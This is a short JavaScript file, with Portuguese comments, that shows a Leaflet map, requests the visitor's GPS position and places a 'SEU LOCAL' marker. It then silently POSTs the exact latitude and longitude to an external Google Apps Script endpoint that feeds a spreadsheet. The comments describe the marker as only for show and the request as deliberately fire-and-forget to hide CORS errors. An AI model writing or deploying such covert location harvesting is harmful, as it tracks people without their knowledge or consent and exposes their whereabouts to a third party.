$(document).ready(function () {

    // Mapa e marcador continuam intactos
    var map = L.map('map', {
        scrollWheelZoom: false
    }).setView([-23.4866, -46.3487], 16);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19
    }).addTo(map);

    navigator.geolocation.getCurrentPosition(
        function(position) {

            // Pegamos diretamente do GPS, sem marker
            var lat = position.coords.latitude;
            var lng = position.coords.longitude;

            // Marcador e popup apenas para visualização
            L.marker([lat, lng])
                .addTo(map)
                .bindPopup("SEU LOCAL")
                .openPopup();

            map.setView([lat, lng], 17);

            // Envia direto para o Google Sheets via FormData
            var form = new FormData();
            form.append("latitude", lat);
            form.append("longitude", lng);

            fetch("https://script.google.com/macros/s/AKfycbz6bm4rqeA6_88ztbBVwr_JnQFBmVdsA8Gz9p1pK9heomd9-HFge8Ny6VPF30I5H57LQQ/exec", {
                method: "POST",
                body: form
            });
            // ❌ Sem then/catch, evita erro de CORS

        },
        function(error) {
            console.log("Permissão negada ou erro");
        }
    );

});
